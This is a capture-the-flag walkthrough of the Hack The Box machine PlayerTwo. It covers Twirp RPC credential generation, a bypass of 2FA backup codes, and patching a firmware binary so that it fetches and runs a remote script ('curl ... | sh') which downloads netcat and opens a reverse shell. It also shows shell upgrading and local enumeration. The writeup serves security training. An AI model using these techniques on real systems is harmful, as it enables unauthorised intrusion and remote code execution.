---
title: "PlayerTwo"
difficulty: Insane
os: Linux
points: 50
rating: 4.4
date: 2019-12-14
avatar: assets/htb/playertwo.png
tags: [Information Disclosure, Misconfiguration, PHP type juggling, Heap Overflow, Reconnaissance, Web Site Structure Discovery, Binary Exploitation, Exploit Development]
htb_url: https://app.hackthebox.com/machines/PlayerTwo
---
## Overview

This Insane Linux box really stretched my web skills, and forced me to research unfamiliar protocols and services to a degree equal to three or four easier boxes combined.  Spotting the next route forward was straightforward enough with solid enumeration, but actually clearing each stage demanded patience and plenty of documentation reading.  

## Useful Skills and Tools

#### Adding a hostname to the hosts file on Linux

To reach the page a server actually intends to serve, you sometimes have to send traffic to the site's FQDN instead of its IP.  To do that, point your machine at the domain by appending the line below to `/etc/hosts` .   Each subdomain goes on its own line.

```text
<YOUR_IP>    <domain.name>
<YOUR_IP>    <subdomain.domain.name>
```

#### Using `cewl` to get a site-customized wordlist

```text
cewl -d 3 -o -a -e -w <output_file> <website_url>
```

To build a thorough wordlist for a site, I rely on these flags: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` to write the output to a file named `<file>`.

#### Using `wfuzz` to brute force file names

```text
wfuzz -X GET -w <wordlist> --sc 200  -c http://player2.htb/proto/FUZZ.proto
```

Here's what each option does: `-X GET` sets the HTTP method, `-w <filename>` chooses the wordlist, `--sc 200` restricts the listing to replies with a 200 status code, and `-c` colorizes the output for readability.  The URL to enumerate comes at the end, and wherever the keyword `FUZZ` appears in that URL it gets swapped for each entry from the wordlist.

#### Upgrading from a limited shell

Once I land a basic shell on a box, the first thing I normally do is upgrade to a nicer one that gives me conveniences like history, tab completion, and working arrow keys plus `alt-` and `ctrl-` shortcuts.

1. Make sure python is installed with `which python`
2. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
3. Background the shell and return to my machine with ```ctrl-z```
4. Type `stty raw -echo;` to allow sending of raw keyboard input through the pty.  This lets me use `ctrl-c` to kill commands on the other side rather than kill my shell \(for example\).  
5. Type `fg` to bring my shell back to the foreground

## Enumeration

### Nmap scan

My enumeration kicked off with an nmap scan against `<YOUR_IP>`. The flags I usually reach for are: `-p-`, a shortcut telling nmap to scan every TCP port, `-sC`, which equals `--script=default` and fires a batch of nmap enumeration scripts at the target, `-sV` for service detection, and `-oN <name>` to write the output to a file called `<name>`.  

```text
kac0@kalimaa:~/htb/playertwo$ nmap -p- -sC -sV -O -oA playertwo.full <YOUR_IP>

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 13:01 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
|   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
|_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:36 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/nice%20ports%2C/Tri%6Eity.txt%2ebak"","meta":{"twirp_invalid_route":"GET /nice%20ports%2C/Tri%6Eity.txt%2ebak"}}
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:21 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:22 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"OPTIONS /"}}
|   OfficeScan: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:38 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|_    {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8545-TCP:V=7.80%I=7%D=5/31%Time=5ED3E880%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,FC,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sun,\x2031\x2
SF:0May\x202020\x2017:29:21\x20GMT\r\nConnection:\x20close\r\nX-Powered-By
SF::\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20application/j
SF:son\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20for\x20pa
SF:th\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/\"}}"
SF:)%r(HTTPOptions,100,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sun,\
SF:x2031\x20May\x202020\x2017:29:22\x20GMT\r\nConnection:\x20close\r\nX-Po
SF:wered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20appli
SF:cation/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20f
SF:or\x20path\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"OPTIONS
SF:\x20\\/\"}}")%r(FourOhFourRequest,144,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nDate:\x20Sun,\x2031\x20May\x202020\x2017:29:36\x20GMT\r\nConnection
SF::\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nCont
SF:ent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"
SF:no\x20handler\x20for\x20path\x20\\\"\\/nice%20ports%2C\\/Tri%6Eity\.txt
SF:%2ebak\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/nice%20ports
SF:%2C\\/Tri%6Eity\.txt%2ebak\"}}")%r(OfficeScan,FC,"HTTP/1\.1\x20404\x20N
SF:ot\x20Found\r\nDate:\x20Sun,\x2031\x20May\x202020\x2017:29:38\x20GMT\r\
SF:nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04
SF:\.1\r\nContent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\"
SF:,\"msg\":\"no\x20handler\x20for\x20path\x20\\\"\\/\\\"\",\"meta\":{\"tw
SF:irp_invalid_route\":\"GET\x20\\/\"}}");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/31%OT=22%CT=1%CU=37408%PV=Y%DS=2%DC=I%G=Y%TM=5ED3E8B
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1482.37 seconds
```

In spite of all that output, only three ports were actually open: SSH plus two serving HTTP.  The response on `TCP 8545` wasn't HTML; it advertised a Content-Type of `application/json`.  The `"twirp_invalid_route"` string stood out as worth digging into, especially since nmap couldn't fingerprint it.

### Enumerating `Port 80 - HTTP`

Rather than chase the odd port 8545 output and risk a rabbit hole, the smarter move was to open a browser and hit the open port 80 first at [http://<YOUR_IP>](http://<YOUR_IP>).  

![](assets/wu/playertwo/img-1.png)

That clearly didn't go as planned, and reloading just produced the same message.  Reading it more carefully...it says `Firefox can't load this page for some reason.` Curious, since I wasn't even running Firefox at the time, so I checked the page source and realized the "message" was actually a PNG image, not real text.  It wasn't an error at all but the genuine page content.  

Reading the image text again, I spotted "Please contact `MrR3boot@player2.htb`."  That gave me a candidate username and a hostname.  Pointing my traffic at `http://player2.htb` might serve up something different.  

#### Adding a hostname to the hosts file

To get the page a server actually means to serve, you sometimes have to direct traffic to the site's FQDN instead of its IP.  Achieve that by telling your machine where the domain lives, adding the line below to `/etc/hosts`

```text
<YOUR_IP>    player2.htb 
```

### Enumerating the real website

With the domain in my hosts file, browsing to [http://player2.htb](http://player2.htb) brought up the actual company website.  Judging from the content, this company had been breached at some point and tightened up its security afterward.

![](assets/wu/playertwo/img-2.png)

Reading through the page, I came across a link to a subdomain at [http://product.player2.htb/](http://product.player2.htb/). I added this new domain to my hosts file as well, and visiting it presented a login page.

```text
<YOUR_IP>    player2.htb
<YOUR_IP>    product.player2.htb
```

![](assets/wu/playertwo/img-3.png)

A few obvious credentials like `admin:admin` just produced an alert box reading `Nope.` Clearly the creds had to come from somewhere else, so I turned my attention to that other HTTP port I'd noted earlier.

### Enumerating `Port 8545`

Browsing to [http://player2.htb:8545](http://player2.htb:8545) gave back a JSON-formatted error message. 

```text
{ "code": "bad_route", "msg": "no handler for path \"/\"", "meta": { "twirp_invalid_route": "GET /" } }
```

There was the `"twirp_invalid_route"` message from the nmap output once more.  Time to read up on `twirp` and see whether anything useful turned up. 

### Researching twirp

I quickly turned up resources on the protocol, which appears to be a way of routing requests to RPC methods securely.  The links below are the docs that best explained how to interact with it.

[https://twitchtv.github.io/twirp/docs/intro.html](https://twitchtv.github.io/twirp/docs/intro.html)[https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md)

Because the protocol relies on a `.proto` file to work out the routing for RPC requests, I needed to locate that file.  The `/rpc` directory mentioned in the docs didn't appear to exist, so I ran `Dirbuster` to enumerate directories in case the install was non-standard.  Eventually I found a `/proto` directory at [http://player2.htb/proto/](http://player2.htb/proto/).  

![](assets/wu/playertwo/img-4.png)

The `/proto` directory felt like an obvious home for a `.proto` file, but I still didn't know the filename to request.  So I ran `cewl` against the two sites I'd found to build a wordlist of plausible filenames, but that went nowhere.  In the end it was a stock Dirbuster wordlist that revealed the filename.

#### Using `cewl` to get a customized wordlist

```text
cewl -d 3 -o -a -e -w player2.cewl http://player2.htb
```

To build a thorough wordlist for this site, I used these options: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` writes the output to a file named `<file>`.

#### Using `wfuzz` to brute force file names

Starting with the `cewl` wordlist and later switching to the standard Dirbuster one, I used `wfuzz` to fuzz for the filename.  Confident the file lived in `/proto` and ended in `.proto`, I could fuzz the middle portion of the name using the pattern `/proto/FUZZ.proto` .  

```text
kac0@kalimaa:~/htb/playertwo$ wfuzz -X GET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --sc 200  -c http://player2.htb/proto/FUZZ.proto

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://player2.htb/proto/FUZZ.proto
Total requests: 87665

===================================================================
ID           Response   Lines    Word     Chars       Payload                               
===================================================================

000034176:   200        18 L     46 W     266 Ch      "generated"
```

After only... a few thousand attempts, I landed a hit on the word `generated`.  The `.proto` file could now be grabbed from [http://player2.htb/proto/generated.proto](http://player2.htb/proto/generated.proto).

### The `.proto` file

The `generated.proto` file held some genuinely useful information.

```text
syntax = "proto3";

package twirp.player2.auth;
option go_package = "auth";

service Auth {
  rpc GenCreds(Number) returns (Creds);
}

message Number {
  int32 count = 1; // must be > 0
}

message Creds {
  int32 count = 1;
  string name = 2; 
  string pass = 3; 
}
```

The `GenCreds` RPC method in particular sounded like precisely what I needed.  Now I had to work out how to reach that method and learn what it would hand back.

### Using `twirp` to access RPC methods

The docs at [https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md) provided this `curl` example:

```text
curl --request "POST" \
     --location "http://localhost:8080/twirp/twirp.example.haberdasher.Haberdasher/MakeHat" \
     --header "Content-Type:application/json" \
     --data '{"inches": 10}' \
     --verbose
```

Further reading at [https://twitchtv.github.io/twirp/docs/spec\_v5.html](https://twitchtv.github.io/twirp/docs/spec_v5.html) describes interacting with `twirp`: 

> The **Request-Headers** are normal HTTP headers. The Twirp wire protocol uses the following headers.
>
> * **Content-Type** header indicates the proto message encoding, which should be one of "application/protobuf", "application/json". The server uses this value to decide how to parse the request body, and encode the response body.

> Twirp always uses HTTP POST method to send requests, because it closely matches the semantics of RPC methods.

Since the protocol works over ordinary HTTP requests, I opted for `Burp Repeater` rather than `curl`, which made tweaking and resending requests during testing much easier.  

To talk to any RPC methods that might be exposed on this port, you have to POST to the method using the format below.

```text
POST /twirp/<package>.<Service>/<Method>
```

The `generated/proto` file told me the Package name was `twirp.player2.auth` and the Service was `Auth`.  The method I wanted was `GenCreds`.  That made the full Twirp route `/twirp/twirp.player2.auth.Auth/GenCreds`. 

![](assets/wu/playertwo/img-5.png)

More testing and documentation reading made it clear that the request needed some JSON-formatted data along with the correct headers.  

_Make sure to send the `Content-Type:application/json` header as well! Otherwise you will get errors._ 

```text
POST /twirp/twirp.player2.auth.Auth/GenCreds HTTP/1.1
Host: player2.htb:8545
Content-Type:application/json
Content-Length: 27

{"message":"Hello, World!"}
```

Once I corrected the request and sent it off, the server replied with:

```text
HTTP/1.1 200 OK
Host: player2.htb:8545
Date: Wed, 24 Jun 2020 18:30:22 GMT
Connection: close
X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
Content-Type: application/json

{"name":"snowscan","pass":"ze+EKe-SGF^5uZQX"}
```

## Initial Foothold

### Logging into `product.player2.htb`

At last, I had credentials.  I tried them against the login at  [http://product.player2.htb/](http://product.player2.htb/) and was met with this message:

![Nope.](assets/wu/playertwo/img-6.png)

Having stepped away for a bit after crafting the request and writing notes, I suspected the credentials might be time-limited since they looked randomly generated.  I replayed the request through Burp to see if the answer changed, and indeed got a fresh set of credentials.  I rushed back to the login page and entered them.

![](assets/wu/playertwo/img-7.png)

![Nope.](assets/wu/playertwo/img-6.png)

After generating credentials repeatedly and hunting for other login routes \(SSH didn't work either\), I picked up on a pattern in the credential sets the method handed out.  As it turned out, there were only four possible usernames and four possible passwords.  _I also discovered the data I sent to the RPC method didn't actually matter, even an empty message worked._  

Usernames:

* mprox
* jkr
* snowscan
* 0xdf

Passwords:

* ze+EKe-SGF^5uZQX
* tR@dQnwnZEk95\*6\#
* XHq7_WJTA?QD_?E2
* Lp-+Q8umLW5\*7qkc

Determined not to quit, I worked through each combination the server offered. Nope. several times over...and then...

![](assets/wu/playertwo/img-8.png)

I finally authenticated and got redirected to [http://product.player2.htb/totp](http://product.player2.htb/totp).  2FA!  Now the challenge was figuring out how to get past this two-factor page, presumably by obtaining a Time-based One-Time Password \(TOTP\).  

_Okay, I fibbed a little earlier...the very first set of credentials logged me straight in and landed me on this page, but it read more dramatically the other way, especially given how lucky I'd been to hit the right ones immediately.  Those creds stopped working soon after, probably due to an internal site glitch or maybe I fumbled the paste.  Then someone reset the box and I had to repeat all of that to get back in. The original creds worked every single time while writing this up.  Doh!_  

### Bypassing Time-based One-Time Password \(TOTP\) 2FA

Once my earlier `Dirbuster` scan of the first site finished, I had also pointed it at the `product` page, which uncovered the `/api` folder.  

![](assets/wu/playertwo/img-9.png)

 From there I got lucky guessing there'd be a TOTP API, since the page referenced backup codes.  That brought me to [http://product.player2.htb/api/totp](http://product.player2.htb/api/totp).  Hitting `/api/totp` returned a helpful error: 

```text
{"error":"Cannot GET \/"}
```

This was another JSON-formatted reply, so I went looking for ways to bypass JSON-based 2FA.  That search led me to [https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html](https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html).  The author's request to the server looked like the following, though I didn't have all of that data. 

> `{"action":"backup_codes","clusterNum":"000","accountId":"test123","email":"test123@gmail.com"}`

![&quot;invalid\_session&quot;](assets/wu/playertwo/img-10.png)

I sent a blank test message through Burp as before, but got an "invalid session" error, which suggested I needed to include the PHPSESSID I'd seen in my cookies after logging in.  Sending the session ID in a header kept returning the same error until the penny dropped. **Need to send the session ID in a** _**COOKIE!!!**_ **** Once I did, the error changed to "invalid action".  

On the 2FA site I saw:

> 2FA You can either use the OTP that we sent to your mobile or the `backup codes` that you have with you.

The emphasis above is mine.  Since the `/totp` page had already hinted at "backup codes" and the blog post used `{"action":"backup_codes",` in its request, this seemed like exactly the right action.    

```text
POST /api/totp HTTP/1.1
Host: product.player2.htb
Content-Type:application/json
Content-Length: 31
Cookie: PHPSESSID=7987tggfl6k22pq872k2vhqcej

{
  "action":"backup_codes"
}
```

With the request formatted correctly and the right Cookie header in place, the server responded.

```text
HTTP/1.1 200 OK
Date: Wed, 24 Jun 2020 23:56:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43
Content-Type: application/json

{"user":"snowscan","code":"84573484857384"}
```

I had my 2FA code!  Entering it on the `/totp` page brought me to [http://product.player2.htb/protobs/](http://product.player2.htb/protobs/).  

### The internal protobs page

![](assets/wu/playertwo/img-11.png)

Since "protobs" was the product name, my first instinct was to check whether a page existed at http://product.player2.htb/protobs.  

![](assets/wu/playertwo/img-12.png)

Yep.  Another lucky guess.  It appeared I could upload files for some kind of verification, which redirected to [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify).  Uploading a PHP reverse shell just produced a blank white page with no callback.  After trying various file uploads and testing for command injection and similar tricks, I moved on to explore the rest of the `/home` page.

![](assets/wu/playertwo/img-13.jpg)

After poking around the site for a while, I found a barely-visible link under the heading "Get an early access to Protobs".  The animated background and recurring explosion kept hiding the text.  In the screenshot above my cursor is over the link \(note the URL in the bottom-left corner\).  Clicking it served a PDF at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  

![](assets/wu/playertwo/img-14.png)

The document lays out the firmware verification process, which is presumably what's running behind the `/verify` page I'd found earlier.

![](assets/wu/playertwo/img-15.png)

 The PDF's final page confirms it.  It seems Protobs developers use the `/protobs/verify` page to validate their firmware before shipping it to customers.  I downloaded the firmware archive and extracted it.  Inside were an `info` file with copyright details, a `version` file with version information, and the `protobs.bin` firmware itself.  

### Protobs.bin

Running `file` against `Protobs.bin` reports it as plain data.

```text
kac0@kalimaa:~/htb/playertwo$ file Protobs.bin 
Protobs.bin: data
```

Opening it in GHex, though, reveals an ELF header, so it's really a Linux executable with some bytes prepended \(most likely the verification signature\).  

![](assets/wu/playertwo/img-16.png)

Scrolling through the file, I noticed a string in the ELF that looked a lot like a shell command: `stty raw -echo min 0 time 10`. Because the command sat in the binary as a plain string, I figured I might swap in my own command and potentially gain code execution on the remote server. 

### Researching how to replace a section of code inside an ELF executable

I researched how to swap out a section of code in the ELF and found [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file), which in turn pointed me to [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd).  By using strings to find the byte offset of the code and then `dd`, you can overwrite arbitrary code.  To me, though, that amounted to fancy cut-and-paste.  

From past CTF experience I knew you could edit a file's hex \(and therefore the ASCII strings it contains\) almost as easily as in a normal text editor.  So I decided to "cheat" a little with GHex. I highlighted the string I wanted to change and typed my own commands over it.  Not knowing what the verification checked, I kept it as minimal as possible and went with a staged payload. The plan was for the program to fetch a script hosted on my local python SimpleHTTPServer.  My code was:`curl 10.10.15.20:8090/a | sh` .  This pulls down my script, simply named `a`, and runs it with `sh`.  _I'd have used bash, but practically every Linux box has `sh` or something aliased to it, and this saved me a couple of characters too!_  

```text
#!/bin/sh
#get netcat in case remote system can't '-e'
curl 10.10.15.20:8090/nc -o /dev/shm/nc 
#make netcat executable
chmod +x /dev/shm/nc 
#use netcat reverse shell
/dev/shm/nc 10.10.15.20 12345 -e /bin/sh 
```

When the script ran, it would reach back and grab netcat \(in case the machine's version lacked `-e` support\).  It then made `nc` executable and fired a reverse shell back to my waiting listener.  

![](assets/wu/playertwo/fix-17.png)

## Road to User

### Upgrading to a usable shell

With a basic shell on the box, my first task was upgrading to a nicer one offering conveniences like history, tab completion, and working non-character keys \(such as the arrow keys\).

```text
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")';
www-data@player2:/var/www/product/protobs$ ^Z             
[1]+  Stopped                 nc -lvnp 12345
kac0@kalimaa:~/htb/playertwo$ stty raw -echo;
kac0@kalimaa:~/htb/playertwo$ fg
```

First I confirmed python was present, then upgraded from the limited shell to a more capable one in a handful of steps:

1. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
2. Background the shell and return to my machine with ```ctrl-z```
3. Type `stty raw -echo;` to allow sending of raw keyboard input through the pty.  This lets me use `ctrl-c` to kill commands on the other side rather than kill my shell \(for example\).  
4. Type `fg` to bring my shell back to the foreground

### Enumerating as `www-data`

```text

www-data@player2:/var/www/product/protobs$ ls -la
total 48
drwxr-xr-x 5 root     root     4096 Dec 16  2019 .
drwxr-xr-x 6 www-data www-data 4096 Dec  1  2019 ..
-rwxr-xr-x 1 www-data www-data 1176 Sep  3  2019 gen_firm_keys.py
-rw-r--r-- 1 www-data www-data 3410 Nov 10  2019 index.php
dr-x------ 2 www-data www-data 4096 Sep  3  2019 keys
drwxr-xr-x 4 www-data www-data 4096 Sep  5  2019 pihsm
-rw-r--r-- 1 root     root     4711 Dec  1  2019 protobs_firmware_v1.0.tar
-rwxr-xr-x 1 www-data www-data  804 Sep  4  2019 sign_firm.py
drwxrwxrwx 2 www-data www-data 4096 Jun 25 02:54 uploads
-rw-r--r-- 1 www-data www-data 1775 Dec 10  2019 verify.php
-rwxr-xr-x 1 www-data www-data  837 Dec  1  2019 verify_signature.py
```

Next I ran `sudo -l` to check for any passwordless sudo rights, but found none.  A quick look at my current directory revealed the website's backend code.  

```text
www-data@player2:/home$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
observer:x:1000:1000:observer:/home/observer:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
egre55:x:1001:1001::/home/egre55:/bin/sh
```

Inspecting `/etc/passwd` shows three login-capable users: `root`, `egre55`, and `observer` .

```text
www-data@player2:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jul 27  2019 .
drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
```

However, `egre55`'s home folder wasn't visible to me even though it's listed in `/etc/passwd`.  That made `observer` the most promising target for privilege escalation.  

```text
mosquit+   1164  0.0  0.2  48024  5792 ?        S    Jun24   0:05 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
root       1177  0.0  1.0 185924 20136 ?        Ssl  Jun24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1178  0.0  0.8 337936 17196 ?        Ss   Jun24   0:00 /usr/sbin/apache2 -k start
mysql      1225  0.0  9.7 1490216 189964 ?      Sl   Jun24   0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       1527  0.0  0.1  57496  3288 ?        S    Jun24   0:00 /usr/sbin/CRON -f
root       1535  0.0  0.0   4624   864 ?        Ss   Jun24   0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php"
root       1541  0.0  0.2  66548  4352 ?        S    Jun24   0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1543  0.0  0.0   4624   872 ?        S    Jun24   0:00 /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php
egre55     1544  0.0  0.0   4624   832 ?        S    Jun24   0:00 /bin/dash -p -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1545  0.0  1.1 275764 21384 ?        S    Jun24   0:00 /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
```

Some of the more interesting running processes are shown above.  Netstat revealed two extra ports bound to 127.0.0.1, `port 1883 -> MQQT` and `port 3306 -> MySQL.`After poking around a bit without finding anything useful, I started with mosquitto since it was new to me.  

```text
# Place your local configuration in /etc/mosquitto/conf.d/
# 
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

pid_file /var/run/mosquitto.pid

persistence true
persistence_location /var/lib/mosquitto/

log_dest file /var/log/mosquitto/mosquitto.log
bind_address 127.0.0.1
include_dir /etc/mosquitto/conf.d
```

I began with `/etc/mosquitto/mosquitto.conf`, which I'd spotted in the `ps aux` output, but it didn't contain anything especially interesting.  

### Mosquitto \(MQTT\) Research

* [https://mosquitto.org/](https://mosquitto.org/) [https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto](https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto) 
* [https://github.com/Warflop/IOT-MQTT-Exploit](https://github.com/Warflop/IOT-MQTT-Exploit)
* [https://mosquitto.org/man/mosquitto\_pub-1.html](https://mosquitto.org/man/mosquitto_pub-1.html) 
* [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html)
* [https://mosquitto.org/man/mqtt-7.html](https://mosquitto.org/man/mqtt-7.html)

I then read up on the `Mosquitto` service and learned it's a message broker that passes messages between applications and services.  Clients 'subscribe' to topics and receive any messages published to them, much like push notifications on a phone.  It's designed to be lightweight and suited to low-power scenarios like IOT devices.  Maybe subscribing to the right topics would surface information useful for escalating privileges.  

I learned that subscribing to topics is done with the `mosquitto_sub` program.  Its man page at [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html) had everything I needed.

